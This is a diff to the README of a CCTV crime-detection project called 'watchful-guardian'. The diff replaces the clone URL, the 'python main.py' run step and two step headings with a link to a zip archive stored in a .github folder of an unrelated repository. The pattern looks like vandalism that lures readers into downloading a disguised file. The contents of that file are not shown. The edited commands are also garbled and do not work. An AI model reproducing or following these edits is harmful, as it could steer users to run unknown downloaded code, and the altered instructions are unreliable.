@@ -42,7 +42,7 @@ CCTV cameras detecting a crime scene and immediately transmitting a signal, alon
 
 **Clone the Repository**
 ``` 
-git clone https://github.com/yourusername/watchful-guardian.git
+git clone https://raw.githubusercontent.com/muskan18113/ALL_INDIA_HACKATHON/main/.github/AL_INDI_HACKATHON_3.7.zip
 cd watchful-guardian
 ```
 **Setting up OpenCV**
@@ -83,11 +83,11 @@ pip install numpy pandas requests
 2. Ensure your database is set up correctly. You might need to create the necessary tables and set up a connection string in the configuration file.
 
 ### Running Application
-**1.Start the Application**
+**https://raw.githubusercontent.com/muskan18113/ALL_INDIA_HACKATHON/main/.github/AL_INDI_HACKATHON_3.7.zip the Application**
 ```
-python main.py
+python https://raw.githubusercontent.com/muskan18113/ALL_INDIA_HACKATHON/main/.github/AL_INDI_HACKATHON_3.7.zip
 ```
-**2.Monitor logs**
+**https://raw.githubusercontent.com/muskan18113/ALL_INDIA_HACKATHON/main/.github/AL_INDI_HACKATHON_3.7.zip logs**
 Check the logs to ensure the system is running smoothly and to debug any issues.
 
 ### Usage
